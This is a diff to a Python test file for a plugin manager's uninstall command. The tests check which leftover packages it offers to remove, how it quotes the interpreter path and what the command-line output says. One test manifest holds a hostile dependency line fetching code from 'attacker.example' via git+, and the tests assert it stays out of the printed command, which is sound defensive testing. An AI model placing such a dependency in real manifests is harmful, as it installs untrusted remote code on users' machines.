@@ -3,8 +3,13 @@
 from __future__ import annotations
 
 import argparse
+import importlib.metadata
 import io
+import json
+import os
 import signal
+import subprocess
+import sys
 import tarfile
 from pathlib import Path
 from textwrap import dedent
@@ -18,9 +23,11 @@ except ModuleNotFoundError:  # pragma: no cover - exercised only on the 3.10 CI 
 
 import plugins as plugin_cli
 from app.core import plugin_loader
+from app.core.packs import catalog as packs_catalog
 from app.core.packs import runner as packs_runner
 from app.core.plugin_validator import PluginValidationError
 from app.core.plugins import catalog as core_catalog
+from app.core.plugins import deps as core_deps
 from app.core.plugins import github as core_github
 from app.core.plugins import lifecycle
 
@@ -968,6 +975,14 @@ def test_a_downloaded_pack_is_uninstalled_when_its_files_do_go(
     assert plugin_loader.removed_ids(plugin_loader.load_lockfile()) == set()
 
 
+#: A distribution nothing requires, no other plugin declares and no pack
+#: installs: the one kind of package an uninstall offers to remove (#414).
+#: Made up on purpose. A real name -- these tests used ``tabulate`` -- is one
+#: some installed package may name tomorrow, and pandas already does, under
+#: its ``output-formatting`` extra.
+ORPHAN = "codefyui-orphan-probe"
+
+
 def test_a_dep_name_no_install_would_accept_stays_out_of_the_command(
     isolated_lockfile
 ):
@@ -980,7 +995,7 @@ def test_a_dep_name_no_install_would_accept_stays_out_of_the_command(
     plugin_dir = isolated_lockfile / "ghost"
     _write_plugin_dir(plugin_dir, "ghost")
     (plugin_dir / "cdui.plugin.toml").write_text(
-        dedent("""\
+        dedent(f"""\
             [plugin]
             id = "ghost"
             name = "Local ghost"
@@ -988,7 +1003,7 @@ def test_a_dep_name_no_install_would_accept_stays_out_of_the_command(
             schema_version = 1
 
             [python_deps]
-            tabulate = ">=0.9"
+            {ORPHAN} = ">=1.0"
             "evil @ git+https://attacker.example/evil" = ""
             """),
         encoding="utf-8",
@@ -1001,8 +1016,8 @@ def test_a_dep_name_no_install_would_accept_stays_out_of_the_command(
 
     outcome = lifecycle.uninstall_plugin("ghost")
     assert outcome is not None
-    assert outcome.python_deps_left == ("tabulate",)
-    assert outcome.uninstall_command.endswith(" tabulate")
+    assert outcome.python_deps_left == (ORPHAN,)
+    assert outcome.uninstall_command.endswith(f" {ORPHAN}")
     assert "git+" not in outcome.uninstall_command
 
 
@@ -1039,6 +1054,343 @@ def test_a_dep_name_carrying_a_newline_is_not_a_dep_name(isolated_lockfile):
     # No names left means no command at all, rather than one ending in a
     # dangling newline.
     assert outcome.uninstall_command is None
+
+
+# ── uninstall: only what nothing else needs is offered for removal ─────────
+#
+# ``python_deps_left`` becomes a ``uv pip uninstall`` line the user is told to
+# run, so a package something here still needs must not be on it: run as
+# told, the line would break whatever needed it (#414). These build a real
+# outcome through the lifecycle, over manifests in a temp user root; nothing
+# is installed or removed.
+
+
+def _install_downloaded(
+    root: Path, plugin_id: str, python_deps: dict[str, str],
+    *, enabled: bool = True,
+) -> None:
+    """Record a downloaded plugin whose manifest declares *python_deps*."""
+    plugin_dir = root / plugin_id
+    _write_plugin_dir(plugin_dir, plugin_id)
+    manifest = plugin_dir / "cdui.plugin.toml"
+    table = "".join(f'"{name}" = "{spec}"\n'
+                    for name, spec in python_deps.items())
+    manifest.write_text(
+        manifest.read_text(encoding="utf-8") + "\n[python_deps]\n" + table,
+        encoding="utf-8",
+    )
+    lockfile = plugin_loader.load_lockfile()
+    lockfile.setdefault("plugins", {})[plugin_id] = {
+        "source_kind": "github_url", "source": f"alice/{plugin_id}",
+        "enabled": enabled,
+    }
+    plugin_loader.save_lockfile(lockfile)
+
+
+def test_a_package_codefyui_itself_needs_is_not_offered_for_removal(
+    isolated_lockfile
+):
+    """``numpy`` is one of CodefyUI's own dependencies. A plugin that
+    declares it must not hand over the line that uninstalls it: run as told,
+    that line breaks the install that printed it. Read off this interpreter's
+    real metadata, because the point is that the project's own tree is
+    walked -- a stand-in could only prove that the stand-in is."""
+    _install_downloaded(isolated_lockfile, "ghost",
+                        {"numpy": ">=1.24", ORPHAN: ">=1.0"})
+
+    outcome = lifecycle.uninstall_plugin("ghost")
+    assert outcome is not None
+    assert outcome.python_deps_left == (ORPHAN,)
+    assert outcome.uninstall_command == core_deps.manual_uninstall_command(
+        [ORPHAN])
+
+
+def test_codefyui_itself_is_never_offered_for_removal(isolated_lockfile):
+    """Nothing requires CodefyUI -- it is the top of the tree -- so the
+    walk alone would hand a plugin that names it the line that uninstalls
+    the application itself. Its own name is kept outright, in any spelling."""
+    _install_downloaded(isolated_lockfile, "ghost",
+                        {"CodefyUI_Backend": "", ORPHAN: ""})
+
+    outcome = lifecycle.uninstall_plugin("ghost")
+    assert outcome is not None
+    assert outcome.python_deps_left == (ORPHAN,)
+
+
+@pytest.mark.parametrize("enabled", [True, False], ids=["enabled", "disabled"])
+def test_a_package_another_installed_plugin_declares_is_not_offered(
+    isolated_lockfile, enabled
+):
+    """Removing one plugin must not take a package from the next. A disabled
+    neighbour counts as much as an enabled one: switching it back on has to
+    find its packages where it left them. Names compare by their PEP 503
+    form, so the neighbour's spelling of the same package still matches."""
+    _install_downloaded(isolated_lockfile, "ghost",
+                        {"codefyui-shared-probe": "", ORPHAN: ""})
+    _install_downloaded(isolated_lockfile, "neighbour",
+                        {"CodefyUI_Shared.Probe": ">=1.0"}, enabled=enabled)
+
+    outcome = lifecycle.uninstall_plugin("ghost")
+    assert outcome is not None
+    assert outcome.python_deps_left == (ORPHAN,)
+
+
+def test_a_package_a_package_center_pack_installs_is_not_offered(
+    isolated_lockfile, monkeypatch
+):
+    """A Package Center pack pip-installs a top-level package that nothing
+    ``requires`` -- that is what makes it a pack -- so only the catalog can
+    say the package is spoken for. Every pack in it counts, installed or
+    not: asking which are installed means importing ``packs.state``, and
+    ``app.config`` with it, inside the uninstall's lock. So the stand-in
+    pack's module is one nothing provides, and the pack reads as NOT
+    installed. (The real catalog's one pip pack is also a CodefyUI extra,
+    which would pass this for the wrong reason.) The pack spells the package
+    its own way, so the catalog's name is matched by its PEP 503 form too,
+    not only the manifest's."""
+    pack = packs_catalog.Pack(
+        pack_id="probe-pack", title="Probe", description="A stand-in pack.",
+        pip=("CodefyUI_Pack.Probe>=1.0",),
+        probe_modules=("codefyui_pack_probe_not_installed",),
+        items=(), depends_on=(), install_mode="live",
+    )
+    monkeypatch.setattr(packs_catalog, "iter_packs", lambda: (pack,))
+    _install_downloaded(isolated_lockfile, "ghost",
+                        {"codefyui-pack-probe": "", ORPHAN: ""})
+
+    outcome = lifecycle.uninstall_plugin("ghost")
+    assert outcome is not None
+    assert outcome.python_deps_left == (ORPHAN,)
+
+
+class _FakeDist:
+    """The parts of ``importlib.metadata.Distribution`` the walk reads."""
+
+    def __init__(self, name: str, requires: list[str] | None):
+        self.metadata = {"Name": name}
+        self.requires = requires
+
+
+def test_any_extra_or_marker_keeps_a_package_and_nothing_keeps_itself(
+    monkeypatch
+):
+    """Keeping one package too many costs some disk; removing one too many
+    breaks whatever needed it. So a requirement counts under any extra and
+    any marker, even one this machine would never install, and a line
+    ``packaging`` cannot parse still keeps the name it starts with. What a
+    package requires of ITSELF -- ``selfish[extra]``, the usual spelling of
+    an ``all`` extra -- keeps nothing: it goes when its owner does."""
+    monkeypatch.setattr(importlib.metadata, "distributions", lambda **_: iter([
+        _FakeDist("host", [
+            'extra-only; extra == "docs"',
+            'marker-only; sys_platform == "nonexistent-os"',
+            "Spelled_Oddly>=1",
+            "broken-line (>=1.0",
+        ]),
+        _FakeDist("selfish", ['selfish[extra]; extra == "all"']),
+        _FakeDist("no-requirements", None),
+    ]))
+
+    assert core_deps.orphaned_deps(
+        ["extra-only", "marker-only", "spelled.oddly", "broken-line",
+         "selfish", ORPHAN],
+    ) == ["selfish", ORPHAN]
+
+
+@pytest.mark.parametrize(
+    ("python", "shown"),
+    [
+        (r"C:\Program Files\CodefyUI\python.exe",
+         r'"C:\Program Files\CodefyUI\python.exe"'),
+        (r"D:\CodefyUI\backend\.venv\Scripts\python.exe",
+         r'"D:\CodefyUI\backend\.venv\Scripts\python.exe"'),
+        ("/home/ada/CodefyUI/backend/.venv/bin/python",
+         "/home/ada/CodefyUI/backend/.venv/bin/python"),
+    ],
+    ids=["space", "backslashes", "posix"],
+)
+def test_the_uninstall_line_quotes_the_interpreter_as_the_install_line_does(
+    monkeypatch, python, shown
+):
+    """The line is pasted into whatever shell the user has open. A space
+    splits an unquoted path in every one of them, and Git Bash eats the
+    backslashes of an unquoted Windows path. The install line had that rule
+    already; the uninstall line is built by the same one, so the two lines a
+    user is handed are never quoted two ways."""
+    monkeypatch.setattr(sys, "executable", python)
+
+    assert core_deps.manual_uninstall_command([ORPHAN, "tabulate"]) == (
+        f"uv pip uninstall --python {shown} {ORPHAN} tabulate")
+    assert core_deps.manual_install_command(["tabulate>=0.9"]) == (
+        f'uv pip install --python {shown} "tabulate>=0.9"')
+
+
+def test_an_uninstall_goes_ahead_when_the_leftover_report_fails(
+    isolated_lockfile, monkeypatch, caplog
+):
+    """What an uninstall leaves behind is advice, worked out inside the
+    uninstall's lock. An exception there must cost the advice and nothing
+    else: the plugin is removed, no package is named, and the reason is
+    logged. Otherwise a report nobody needed to read keeps a plugin
+    installed."""
+    _install_downloaded(isolated_lockfile, "ghost", {ORPHAN: ""})
+
+    def _boom(*_args, **_kwargs):
+        # A KeyError, because its ``str`` is the bare key: a log line that
+        # printed only that would name no failure at all.
+        raise KeyError("the leftover report broke")
+
+    monkeypatch.setattr(lifecycle, "orphaned_deps", _boom)
+
+    outcome = lifecycle.uninstall_plugin("ghost")
+    assert outcome is not None
+    assert outcome.removed is True
+    assert outcome.python_deps_left == ()
+    assert outcome.uninstall_command is None
+    assert "ghost" not in plugin_loader.load_lockfile()["plugins"]
+    assert not (isolated_lockfile / "ghost").exists()
+    assert "KeyError('the leftover report broke')" in caplog.text
+
+
+def test_a_codefyui_setting_that_does_not_parse_does_not_stop_an_uninstall(
+    isolated_lockfile
+):
+    """``CODEFYUI_DEBUG=maybe`` is refused by ``app.config`` the moment it is
+    imported. Nothing an uninstall does reads it, and the leftover report
+    must not import it either -- it once did, through ``packs.state``, and
+    the uninstall failed with a traceback and left the plugin installed.
+
+    Its own process, because only there is the uninstall the first thing to
+    import ``app.config``: in this one it was imported long ago. The report
+    still names the package, so the path never imports it at all rather
+    than failing quietly."""
+    _install_downloaded(isolated_lockfile, "ghost", {ORPHAN: ""})
+    backend = Path(__file__).resolve().parents[1]
+    env = {
+        **os.environ,
+        "CODEFYUI_USER_DATA_DIR": str(isolated_lockfile.parent),
+        "CODEFYUI_DEBUG": "maybe",
+        "CODEFYUI_LANG": "en",
+        "PYTHONIOENCODING": "utf-8",
+        "PYTHONPATH": os.pathsep.join(
+            part for part in (str(backend), os.environ.get("PYTHONPATH", ""))
+            if part),
+    }
+
+    done = subprocess.run(
+        [sys.executable, str(Path(plugin_cli.__file__).resolve()),
+         "uninstall", "ghost"],
+        env=env, capture_output=True, text=True, encoding="utf-8",
+        errors="replace", timeout=300,
+    )
+    assert done.returncode == 0, done.stdout + done.stderr
+    assert "Removed ghost" in done.stdout
+    assert ORPHAN in done.stdout
+    lockfile = json.loads(
+        (isolated_lockfile / "installed.json").read_text(encoding="utf-8"))
+    assert "ghost" not in lockfile["plugins"]
+
+
+# ── uninstall: what stays installed is said, as the Plugin Center says it ──
+#
+# A plugin's Python packages outlive its uninstall -- the lifecycle module
+# says why -- and the Plugin Center names them and hands over the line that
+# removes them. #414 was the terminal saying nothing about them while holding
+# the same outcome. The flow is stubbed: what is under test is the printing,
+# and nothing is installed or removed.
+
+
+def _stub_uninstall(monkeypatch, **fields) -> None:
+    """Hand ``cdui plugin uninstall`` this outcome instead of the flow's own.
+
+    A real :class:`lifecycle.UninstallOutcome` rather than a look-alike, so a
+    field the flow renames fails here instead of passing against a copy."""
+    outcome = lifecycle.UninstallOutcome(
+        plugin_id="demo",
+        removed=True,
+        files_removed=None,
+        reinstall_hint="cdui plugin install demo",
+        **fields,
+    )
+    monkeypatch.setattr(lifecycle, "uninstall_plugin",
+                        lambda plugin_id, **_kwargs: outcome)
+
+
+@pytest.mark.parametrize(
+    ("lang", "removed", "left"),
+    [
+        ("en", "Removed demo",
+         "These Python packages stay installed: model2vec, numpy. To remove "
+         "them, stop the server and run:"),
+        ("zh", "已移除 demo",
+         "這些 Python 套件還留著：model2vec, numpy。要移除的話，請停止伺服器後執行："),
+    ],
+    ids=["en", "zh"],
+)
+def test_uninstall_names_the_packages_it_leaves_and_the_command_that_removes_them(
+    isolated_lockfile, monkeypatch, capsys, lang, removed, left
+):
+    """The Plugin Center's sentence, then the command on a line of its own.
+
+    The sentence ends in a colon because the command follows it, and a line
+    holding nothing but the command is one a terminal copies exactly. The
+    command is the outcome's, printed as it came: the panel is handed the
+    same string, and a second derivation of it here is the copy that would
+    drift."""
+    monkeypatch.setenv("CODEFYUI_LANG", lang)
+    command = "uv pip uninstall --python /venv/bin/python model2vec numpy"
+    _stub_uninstall(monkeypatch, tombstoned=True,
+                    python_deps_left=("model2vec", "numpy"),
+                    uninstall_command=command)
+
+    assert plugin_cli.main(["uninstall", "demo"]) == 0
+    printed = capsys.readouterr().out
+    assert left in printed
+    lines = printed.splitlines()
+    at = next(i for i, line in enumerate(lines) if left in line)
+    assert lines[at + 1].strip() == command
+    # The panel's order: what went, what stayed, and last how to get the
+    # plugin back.
+    assert printed.index(removed) < printed.index(left)
+    assert printed.index(command) < printed.index("cdui plugin install demo")
+
+
+def test_an_uninstall_that_leaves_no_packages_says_nothing_about_them(
+    isolated_lockfile, monkeypatch, capsys
+):
+    """No names, so no sentence and no command: a heading over an empty list
+    announces nothing. The output ends at the removal line, as it did."""
+    monkeypatch.setenv("CODEFYUI_LANG", "en")
+    _stub_uninstall(monkeypatch, tombstoned=False,
+                    python_deps_left=(), uninstall_command=None)
+
+    assert plugin_cli.main(["uninstall", "demo"]) == 0
+    printed = capsys.readouterr().out
+    assert "Python" not in printed
+    assert "uv pip uninstall" not in printed
+    assert printed.endswith(f"Removed demo{plugin_cli.RESET}\n")
+
+
+def test_a_builtin_pack_that_declared_no_packages_ends_at_the_sync_line(
+    isolated_lockfile, monkeypatch, capsys
+):
+    """The common case, end to end and unstubbed: a built-in pack with no
+    ``[python_deps]``. It is tombstoned, so the last thing said is how to get
+    it back -- and there is nothing about packages to say at all."""
+    monkeypatch.setenv("CODEFYUI_LANG", "en")
+    lockfile = plugin_loader.load_lockfile()
+    lockfile.setdefault("plugins", {})["rl"] = {
+        "source_kind": "builtin", "source": "rl", "enabled": True,
+    }
+    plugin_loader.save_lockfile(lockfile)
+
+    assert plugin_cli.main(["uninstall", "rl"]) == 0
+    printed = capsys.readouterr().out
+    assert "Removed rl" in printed
+    assert "Python" not in printed
+    assert "uv pip uninstall" not in printed
+    assert printed.endswith(
+        f"run `cdui plugin install rl`.{plugin_cli.RESET}\n")
 
 
 def test_cmd_reload_no_server_returns_zero(isolated_lockfile):
